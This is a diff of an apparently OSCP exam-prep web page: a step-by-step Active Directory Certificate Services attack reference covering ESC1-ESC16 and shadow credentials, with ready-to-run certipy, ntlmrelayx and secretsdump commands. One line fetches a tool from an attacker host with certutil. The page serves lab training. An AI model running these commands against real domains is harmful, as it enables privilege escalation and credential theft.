@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="Complete ADCS attack reference covering ESC1-ESC16, shadow credentials, PassTheCert, and real walkthroughs.">
     <meta name="theme-color" content="#020408">
-<title>ADCS ESC1-ESC16 — OSCP+ Reference</title>
+<title>ADCS ESC1-ESC16 - OSCP+ Reference</title>
     <link rel="icon" type="image/svg+xml" href="favicon.svg">
 <style>
 :root{--bg-primary:#0f172a;--bg-secondary:#1e293b;--bg-card:#1e293b;--bg-hover:#334155;--text-primary:#f1f5f9;--text-secondary:#94a3b8;--text-muted:#64748b;--border:#334155;--accent:#3b82f6;--accent-hover:#2563eb;--success:#10b981;--warning:#f59e0b;--danger:#ef4444;--purple:#8b5cf6;--orange:#f97316;--cyan:#06b6d4;--pink:#ec4899;--teal:#14b8a6;--font-mono:'SF Mono','JetBrains Mono','Fira Code',Consolas,monospace;--font-sans:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;--sidebar-width:220px;--header-height:60px;--radius:8px;--shadow:0 4px 6px -1px rgba(0,0,0,.3)}
@@ -245,7 +245,7 @@ const PHASES = [
 {num:18,cmd:'wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Certify.exe',src:'Certify.exe',tags:['linux']},
 {num:19,cmd:'wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Rubeus.exe',src:'Rubeus.exe',tags:['linux']},
 {num:20,cmd:'certutil -urlcache -split -f http://${ATTACKER_IP}/Certify.exe C:\\Windows\\Temp\\Certify.exe',src:'Windows download',tags:['win'],label:'Download to Windows target'},
-{type:'desc',cls:'tip',text:'<strong>ALWAYS sync time first:</strong> <code>sudo ntpdate -u DC_IP</code> — Clock skew kills ALL Kerberos. Most mysterious errors are actually clock skew.'}
+{type:'desc',cls:'tip',text:'<strong>ALWAYS sync time first:</strong> <code>sudo ntpdate -u DC_IP</code> - Clock skew kills ALL Kerberos. Most mysterious errors are actually clock skew.'}
 ]},
 {phase:1,phaseName:'Detect ADCS and Templates',shortName:'Detect',color:'#06b6d4',items:[
 {type:'desc',cls:'info',text:'<strong>STEP 1 on every box: run certipy-ad find.</strong> Use ALL alternatives if primary fails. Import bloodhound output into BloodHound CE for ADCSESC* edges automatically.'},
@@ -279,7 +279,7 @@ const PHASES = [
 ]},
 {phase:2,phaseName:'ESC1: Enrollee Supplies Subject',shortName:'ESC1',color:'#ef4444',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC1 Conditions:</strong> Template has ENROLLEE_SUPPLIES_SUBJECT flag + Client Auth EKU + No Manager Approval + low-priv user can Enroll. Machines: HTB Escape, Authority (via MAQ), Vulnlab Hybrid, Retro, Sendai.'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC1 — Run This First to Confirm Vulnerability'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC1 - Run This First to Confirm Vulnerability'},
 {num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC1',tags:['linux'],label:'Detect ESC1: look for [!] ESC1 in Vulnerabilities section. Output shows CA_NAME (fill above), DNS Name = CA_HOST, and TEMPLATE name. Confirm: ENROLLEE_SUPPLIES_SUBJECT flag + Client Auth EKU + low-priv user has Enroll right.'},
 {type:'sub',label:'STEP 1: Sync Clock (CRITICAL - do before anything)'},
 {num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux'],label:'Sync clock - MANDATORY before any Kerberos op'},
@@ -306,7 +306,7 @@ const PHASES = [
 ]},
 {phase:3,phaseName:'ESC2: Any Purpose EKU',shortName:'ESC2',color:'#f97316',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC2 Conditions:</strong> Template has "Any Purpose" EKU (2.5.29.37.0) or NO EKU. Use as enrollment agent cert then on-behalf-of admin via ESC3 method.'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC2 — Run This First to Confirm Vulnerability'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC2 - Run This First to Confirm Vulnerability'},
 {num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC2',tags:['linux'],label:'Detect ESC2: look for [!] ESC2 in Vulnerabilities section. Confirm: "Any Purpose" EKU (2.5.29.37.0) or No EKU on template. Fill TEMPLATE + CA_NAME from output.'},
 {num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
 {num:2,cmd:'certipy-ad req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}"',src:'certipy-ad Step1',tags:['linux'],label:'Step 1: get Any Purpose cert for self'},
@@ -316,7 +316,7 @@ const PHASES = [
 ]},
 {phase:4,phaseName:'ESC3: Enrollment Agent',shortName:'ESC3',color:'#8b5cf6',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC3 Conditions:</strong> Template A has Cert Request Agent EKU (1.3.6.1.4.1.311.20.2.1). Template B is Schema v1 (User/Machine/SmartcardUser). Two-step: get agent cert then on-behalf-of.'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC3 — Run This First to Confirm Vulnerability'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC3 - Run This First to Confirm Vulnerability'},
 {num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC3',tags:['linux'],label:'Detect ESC3: look for [!] ESC3 in Vulnerabilities section. Confirm: Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1) on Template A. Fill TEMPLATE (Template A) + CA_NAME from output.'},
 {num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
 {num:2,cmd:'certipy-ad req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}"',src:'certipy-ad Step1',tags:['linux'],label:'Step 1: get Enrollment Agent certificate'},
@@ -330,7 +330,7 @@ const PHASES = [
 {phase:5,phaseName:'ESC4: Vulnerable Template ACL',shortName:'ESC4',color:'#14b8a6',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC4 Conditions:</strong> WriteDacl/WriteOwner/WriteProperty/GenericAll on template AD object. ALWAYS backup first, ALWAYS restore after! Machines: HTB EscapeTwo, Vulnlab Sendai, HTB Coder.'},
 {type:'desc',cls:'warn',text:'<strong>EXAM CRITICAL: BACKUP FIRST. RESTORE AFTER. Leaving template modified = detected + permanent backdoor.</strong>'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC4 — Run This First to Confirm Vulnerability'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC4 - Run This First to Confirm Vulnerability'},
 {num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC4',tags:['linux'],label:'Detect ESC4: look for [!] ESC4 in Vulnerabilities section. Confirm: WriteDacl/WriteOwner/WriteProperty/GenericAll ACE on template object for your user. Fill TEMPLATE + CA_NAME from output.'},
 {num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
 {num:2,cmd:'certipy-ad template -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -template "${TEMPLATE}" -save-configuration ${TEMPLATE}_backup.json',src:'certipy-ad backup v5',tags:['linux'],label:'STEP 1: BACKUP (Certipy v5 - do this FIRST)'},
@@ -346,7 +346,7 @@ const PHASES = [
 ]},
 {phase:6,phaseName:'ESC5: Vulnerable PKI Object ACL',shortName:'ESC5',color:'#ec4899',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC5 Conditions:</strong> GenericAll/WriteDacl on CA computer object, NTAuthCertificates, Enrollment Services container, Templates Container, AIA, or CDP. Forest-wide compromise.'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC5 — Run This First to Confirm Vulnerability'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC5 - Run This First to Confirm Vulnerability'},
 {num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC5',tags:['linux'],label:'Detect ESC5: look for [!] ESC5 in Vulnerabilities section. Confirm: GenericAll/WriteDacl on CA object, NTAuthCertificates, Enrollment Services, AIA, or CDP. CA_NAME visible in CA section.'},
 {num:1,cmd:'dsacls "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"',src:'dsacls',tags:['win'],label:'Check NTAuthCertificates ACL'},
 {num:2,cmd:'certipy-ad ca -backup -u ${TARGET_USER}@${DOMAIN} -hashes :${NTHASH} -ca "${CA_NAME}" -target ${CA_HOST} -dc-ip ${DC_IP}',src:'certipy-ad ca backup',tags:['linux'],label:'Path A: Extract CA key (ManageCA or local admin)'},
@@ -356,8 +356,8 @@ const PHASES = [
 ]},
 {phase:7,phaseName:'ESC6: EDITF Flag',shortName:'ESC6',color:'#06b6d4',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC6 Conditions:</strong> CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 allows ANY template to honor user-supplied SAN. Mostly patched by KB5014754. Must chain with ESC9/ESC16 on patched systems.'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC6 — Run This First to Confirm Vulnerability'},
-{num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC6',tags:['linux'],label:'Detect ESC6: look for [!] ESC6 in Vulnerabilities section + "User Specified SAN: Enabled" in CA section. If absent — ESC6 is patched, chain with ESC9/ESC16 instead.'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC6 - Run This First to Confirm Vulnerability'},
+{num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC6',tags:['linux'],label:'Detect ESC6: look for [!] ESC6 in Vulnerabilities section + "User Specified SAN: Enabled" in CA section. If absent - ESC6 is patched, chain with ESC9/ESC16 instead.'},
 {num:1,cmd:'certutil -config "${DC_FQDN}\\\\${CA_NAME}" -getreg policy\\\\EditFlags',src:'certutil detect',tags:['win'],label:'Check for EDITF_ATTRIBUTESUBJECTALTNAME2'},
 {num:2,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout | grep -A5 "ESC6"',src:'certipy-ad detect',tags:['linux'],label:'Certipy detection - User Specified SAN: Enabled'},
 {num:3,cmd:'sudo ntpdate -u ${DC_IP} && certipy-ad req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template User -upn ${TARGET_UPN} -sid ${TARGET_SID}',src:'certipy-ad req ESC6',tags:['linux'],label:'Exploit on unpatched DC'},
@@ -367,8 +367,8 @@ const PHASES = [
 ]},
 {phase:8,phaseName:'ESC7: ManageCA Abuse',shortName:'ESC7',color:'#f59e0b',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC7 Conditions:</strong> ManageCA right (full CA admin) or ManageCertificates right. 5-step SubCA chain. HTB Manager reference machine. CLEANUP SCRIPT EVERY 10MIN on Manager.'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC7 — Run This First to Confirm Vulnerability'},
-{num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC7',tags:['linux'],label:'Detect ESC7: look for [!] ESC7 in Vulnerabilities section. Confirm: ManageCA or ManageCertificates ACE for your user in CA Permissions. CA_NAME is in the CA section — fill the variable above before continuing!'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC7 - Run This First to Confirm Vulnerability'},
+{num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC7',tags:['linux'],label:'Detect ESC7: look for [!] ESC7 in Vulnerabilities section. Confirm: ManageCA or ManageCertificates ACE for your user in CA Permissions. CA_NAME is in the CA section - fill the variable above before continuing!'},
 {num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
 {num:2,cmd:'certipy-ad ca -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${DC_FQDN} -ca "${CA_NAME}" -add-officer ${USERNAME}',src:'certipy-ad add-officer',tags:['linux'],label:'STEP 1: Self-grant ManageCertificates (needs ManageCA)'},
 {num:3,cmd:'certipy-ad ca -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${DC_FQDN} -ca "${CA_NAME}" -enable-template SubCA',src:'certipy-ad enable-template',tags:['linux'],label:'STEP 2: Enable SubCA template'},
@@ -386,8 +386,8 @@ const PHASES = [
 ]},
 {phase:9,phaseName:'ESC8: NTLM Relay to Web Enrollment',shortName:'ESC8',color:'#84cc16',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC8 Conditions:</strong> Web Enrollment role enabled at http://CA/certsrv/. No EPA. Coerce DC to authenticate to attacker -> relay -> get DC machine cert -> DCSync.'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC8 — Run This First to Confirm Vulnerability'},
-{num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC8',tags:['linux'],label:'Detect ESC8: look for [!] ESC8 in Vulnerabilities section + "Web Enrollment: Enabled" (HTTP or HTTPS) in CA section. CA_HOST (DNS Name) is your relay target. If Enabled=False on both — ESC8 does NOT apply.'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC8 - Run This First to Confirm Vulnerability'},
+{num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC8',tags:['linux'],label:'Detect ESC8: look for [!] ESC8 in Vulnerabilities section + "Web Enrollment: Enabled" (HTTP or HTTPS) in CA section. CA_HOST (DNS Name) is your relay target. If Enabled=False on both - ESC8 does NOT apply.'},
 {num:1,cmd:'sudo systemctl stop smbd nmbd && echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start',src:'free port 445',tags:['linux'],label:'FIRST: free port 445 for relay'},
 {num:2,cmd:'sudo impacket-ntlmrelayx -t "http://${CA_HOST}/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController',src:'ntlmrelayx',tags:['linux'],label:'TERMINAL 1: Start relay listener'},
 {num:3,cmd:'sudo certipy-ad relay -target "http://${CA_HOST}" -template DomainController -dc-ip ${DC_IP}',src:'certipy-ad relay',tags:['linux','alt'],label:'TERMINAL 1 Alt: certipy-ad relay (auto-saves PFX)'},
@@ -405,7 +405,7 @@ const PHASES = [
 {phase:10,phaseName:'ESC9: No Security Extension (UPN Flip)',shortName:'ESC9',color:'#d946ef',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC9 Conditions:</strong> Template has CT_FLAG_NO_SECURITY_EXTENSION + DC StrongCertificateBindingEnforcement=0 or 1 + attacker has GenericWrite on VICTIM. HTB Certified reference machine.'},
 {type:'desc',cls:'warn',text:'<strong>CRITICAL: UPN must be bare "administrator" (NO @domain) to avoid collision. RESTORE UPN BEFORE auth. Forgetting this breaks victim logon.</strong>'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC9 — Run This First to Confirm Vulnerability'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC9 - Run This First to Confirm Vulnerability'},
 {num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC9',tags:['linux'],label:'Detect ESC9: look for [!] ESC9 in Vulnerabilities section. Confirm: CT_FLAG_NO_SECURITY_EXTENSION (msPKI-Enrollment-Flag 0x80000) on template. Also confirm GenericWrite on VICTIM_USER via BloodHound before proceeding.'},
 {num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
 {num:2,cmd:'certipy-ad account read -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -user ${VICTIM_USER}',src:'read UPN',tags:['linux'],label:'STEP 1: Read current UPN (save original for restore!)'},
@@ -421,7 +421,7 @@ const PHASES = [
 ]},
 {phase:11,phaseName:'ESC10: Weak Certificate Mappings',shortName:'ESC10',color:'#06b6d4',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC10 Conditions:</strong> Case A: Kerberos StrongCertificateBindingEnforcement=0 registry key. Case B: Schannel CertificateMappingMethods includes UPN bit (0x4). GenericWrite on victim.'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC10 — Run This First to Confirm Vulnerability'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC10 - Run This First to Confirm Vulnerability'},
 {num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC10',tags:['linux'],label:'Detect ESC10: look for [!] ESC10a (Kerberos SBE=0) or [!] ESC10b (Schannel UPN mapping) in Vulnerabilities section. Also confirm GenericWrite on VICTIM_USER via BloodHound.'},
 {num:1,cmd:'reg query "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Kdc" /v StrongCertificateBindingEnforcement',src:'reg SBE',tags:['win'],label:'Detect Case A: value 0=vulnerable'},
 {num:2,cmd:'reg query "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\Schannel" /v CertificateMappingMethods',src:'reg Schannel',tags:['win'],label:'Detect Case B: includes 0x4=UPN mapping'},
@@ -440,7 +440,7 @@ const PHASES = [
 ]},
 {phase:12,phaseName:'ESC11: ICPR RPC Relay',shortName:'ESC11',color:'#84cc16',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC11 Conditions:</strong> CA InterfaceFlags lacks IF_ENFORCEENCRYPTICERTREQUEST (0x200). Like ESC8 but relays to RPC ICPR endpoint. No web enrollment needed.'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC11 — Run This First to Confirm Vulnerability'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC11 - Run This First to Confirm Vulnerability'},
 {num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC11',tags:['linux'],label:'Detect ESC11: look for [!] ESC11 in Vulnerabilities section. Confirm: CA missing IF_ENFORCEENCRYPTICERTREQUEST (0x200) flag. CA_NAME and CA_HOST (DNS Name) visible in output.'},
 {num:1,cmd:'certutil -config "${DC_FQDN}\\\\${CA_NAME}" -getreg CA\\\\InterfaceFlags',src:'certutil detect',tags:['win'],label:'Detect: flag absent = vulnerable'},
 {num:2,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout | grep -i "ESC11\\|ICPR\\|Enforce"',src:'certipy-ad detect',tags:['linux']},
@@ -450,7 +450,7 @@ const PHASES = [
 ]},
 {phase:13,phaseName:'ESC12: Shell on CA - Golden Cert',shortName:'ESC12',color:'#f97316',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC12 Conditions:</strong> Admin/SYSTEM shell on CA host, or ManageCA right. Extract CA private key -> forge arbitrary certs (Golden Certificate). Used in HTB Certificate.'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC12 — Run This First to Confirm Vulnerability'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC12 - Run This First to Confirm Vulnerability'},
 {num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC12',tags:['linux'],label:'Detect ESC12: certipy-ad may NOT flag this as [!] ESC12. Look in CA Permissions section for ManageCA ACE on your user. ESC12 also requires local admin or SYSTEM shell on the CA host to extract the private key. CA_NAME visible in CA section.'},
 {num:1,cmd:'certipy-ad ca -backup -u ${USERNAME}@${DOMAIN} -hashes :${NTHASH} -ca "${CA_NAME}" -target ${CA_HOST} -dc-ip ${DC_IP}',src:'certipy-ad backup remote',tags:['linux'],label:'Method 1: Remote backup (ManageCA or CA admin)'},
 {num:2,cmd:'certutil -backupKey -f -p \'Backup@Pass\' C:\\\\Backup && certutil -exportPFX -p \'Export@Pass\' My <SERIAL> ${CA_NAME}.pfx',src:'certutil backup',tags:['win'],label:'Method 2: certutil on CA host (local admin)'},
@@ -461,8 +461,8 @@ const PHASES = [
 ]},
 {phase:14,phaseName:'ESC13: OID Group Link',shortName:'ESC13',color:'#14b8a6',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC13 Conditions:</strong> Template links to issuance policy OID with msDS-OIDToGroupLink pointing to privileged Universal group. Auth with cert adds group to PAC. Certipy >= 4.8.2 required.'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC13 — Run This First to Confirm Vulnerability'},
-{num:1,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -oids -stdout',src:'certipy-ad detect ESC13',tags:['linux'],label:'Detect ESC13: MUST use -oids flag — ESC13 will NOT appear without it. Look for [!] ESC13 in Vulnerabilities section + "Linked Group" pointing to a privileged Universal group. Fill TEMPLATE + CA_NAME from output.'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC13 - Run This First to Confirm Vulnerability'},
+{num:1,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -oids -stdout',src:'certipy-ad detect ESC13',tags:['linux'],label:'Detect ESC13: MUST use -oids flag - ESC13 will NOT appear without it. Look for [!] ESC13 in Vulnerabilities section + "Linked Group" pointing to a privileged Universal group. Fill TEMPLATE + CA_NAME from output.'},
 {num:2,cmd:'certipy-ad req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}"',src:'certipy-ad req',tags:['linux'],label:'Request cert (PAC gets group membership via OID)'},
 {num:3,cmd:'certipy-ad auth -pfx ${PFX_FILE} -dc-ip ${DC_IP}',src:'certipy-ad auth',tags:['linux'],label:'Authenticate - TGT contains linked group SID'},
 {num:4,cmd:'export KRB5CCNAME=${PFX_FILE%.pfx}.ccache && impacket-secretsdump -k -no-pass -just-dc ${DOMAIN}/${USERNAME}@${DC_FQDN}',src:'secretsdump',tags:['linux']},
@@ -470,7 +470,7 @@ const PHASES = [
 ]},
 {phase:15,phaseName:'ESC14: altSecurityIdentities Abuse',shortName:'ESC14',color:'#ec4899',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC14 Conditions:</strong> Write access to target altSecurityIdentities attribute. 4 scenarios: (A) write strong mapping, (B) RFC822 mapping+write mail, (C) IssuerSubject mapping, (D) SubjectOnly. HTB Scepter machine.'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC14 — Run This First to Confirm Vulnerability'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC14 - Run This First to Confirm Vulnerability'},
 {num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC14',tags:['linux'],label:'Detect ESC14: look for [!] ESC14 in Vulnerabilities section. Confirm: WriteProperty on altSecurityIdentities or mail attribute on TARGET_USER. Also verify via BloodHound: GenericWrite/WriteProperty edge from your user to TARGET_USER.'},
 {type:'sub',label:'Scenario B (most common): target has X509 RFC822 mapping'},
 {num:1,cmd:'bloodyAD -d ${DOMAIN} -u ${USERNAME} -p "${PASSWORD}" --host ${DC_IP} set object ${VICTIM_USER} mail -v ${TARGET_USER}@${DOMAIN}',src:'set mail B',tags:['linux'],label:'Scenario B Step 1: modify victim mail attribute'},
@@ -484,7 +484,7 @@ const PHASES = [
 ]},
 {phase:16,phaseName:'ESC15: EKUwu Schema V1 Templates',shortName:'ESC15',color:'#6366f1',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC15 Conditions (CVE-2024-49019):</strong> Template Schema Version=1 + Enrollee Supplies Subject. Default vulnerable: WebServer, CrossCertificationAuthority. Certipy >= 5.0 required. HTB TombWatcher. Patched Nov 2024.'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC15 — Run This First to Confirm Vulnerability'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC15 - Run This First to Confirm Vulnerability'},
 {num:1,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC15',tags:['linux'],label:'Detect ESC15: requires certipy-ad >= 5.0 or ESC15 will NOT appear. Look for [!] ESC15 in Vulnerabilities section + "Schema Version: 1" + Enrollee Supplies Subject on template. Default vulnerable: WebServer, CrossCertificationAuthority. Fill TEMPLATE + CA_NAME from output.'},
 {num:2,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
 {type:'sub',label:'Path B: Chain to ESC3 - Inject Certificate Request Agent OID (RECOMMENDED)'},
@@ -499,7 +499,7 @@ const PHASES = [
 {phase:17,phaseName:'ESC16: Security Extension Disabled',shortName:'ESC16',color:'#8b5cf6',items:[
 {type:'desc',cls:'warn',text:'<strong>ESC16 Conditions:</strong> CA has szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) in DisableExtensionList. ALL certs lack SID extension. ANY client-auth template works. HTB Fluffy machine. Certipy >= 5.0.2 required.'},
 {type:'desc',cls:'warn',text:'<strong>FLUFFY CRITICAL: faketime required throughout. Clock sync via ntpdate drops VPN on some boxes.</strong>'},
-{type:'sub',label:'⚡ STEP 0: Detect ESC16 — Run This First to Confirm Vulnerability'},
+{type:'sub',label:'⚡ STEP 0: Detect ESC16 - Run This First to Confirm Vulnerability'},
 {num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout',src:'certipy-ad detect ESC16',tags:['linux'],label:'Detect ESC16: requires certipy-ad >= 5.0.2 or ESC16 will NOT appear. Look for [!] ESC16 in Vulnerabilities section + "Disabled Extensions: 1.3.6.1.4.1.311.25.2" in CA section. ANY client-auth template works. CA_NAME visible in CA section.'},
 {num:1,cmd:'certutil -config "${DC_FQDN}\\\\${CA_NAME}" -getreg policy\\\\DisableExtensionList',src:'certutil detect',tags:['win'],label:'Detect: look for 1.3.6.1.4.1.311.25.2 in list'},
 {num:2,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout | grep -i "ESC16\\|DisableExtension"',src:'certipy-ad detect',tags:['linux']},
@@ -513,7 +513,7 @@ const PHASES = [
 ]},
 {phase:18,phaseName:'Shadow Credentials',shortName:'Shadow',color:'#06b6d4',items:[
 {type:'desc',cls:'info',text:'<strong>Shadow Credentials (AddKeyCredentialLink):</strong> Write msDS-KeyCredentialLink on target -> embed public key -> PKINIT as them -> get NT hash. DC functional level 2016+ required. Used before ESC9/10/16.'},
-{type:'sub',label:'⚡ STEP 0: Detect Shadow Credential Write Permission — Run This First'},
+{type:'sub',label:'⚡ STEP 0: Detect Shadow Credential Write Permission - Run This First'},
 {num:0,cmd:'certipy-ad find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -bloodhound -output shadow_enum',src:'certipy-ad BloodHound',tags:['linux'],label:'Detect: Shadow Credentials NOT shown by -vulnerable flag. Generate BloodHound data, import shadow_enum_BloodHound.zip, then look for AddKeyCredentialLink / GenericWrite / GenericAll edges pointing TO VICTIM_USER. No edge = no shadow cred attack path.'},
 {num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
 {num:2,cmd:'certipy-ad shadow auto -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -account ${VICTIM_USER}',src:'certipy-ad shadow auto',tags:['linux'],label:'One-shot: add + auth + get NT hash + cleanup'},
@@ -837,7 +837,7 @@ document.getElementById('modal').addEventListener('click',e=>{if(e.target===docu
 window.addEventListener('beforeunload',()=>localStorage.setItem('adcs_scroll',window.scrollY));
 const sc=localStorage.getItem('adcs_scroll');if(sc)setTimeout(()=>window.scrollTo(0,parseInt(sc)),200);
 
-function setVarsOpen(open){const vb=document.getElementById('vars-body');const btn=document.getElementById('vars-toggle');if(open){vb.classList.add('open');btn.textContent='⚡ TARGET VARIABLES — (collapse)';}else{vb.classList.remove('open');btn.textContent='⚡ TARGET VARIABLES — Click to fill all commands automatically';}localStorage.setItem('adcs_vars_open',open?'1':'0');}
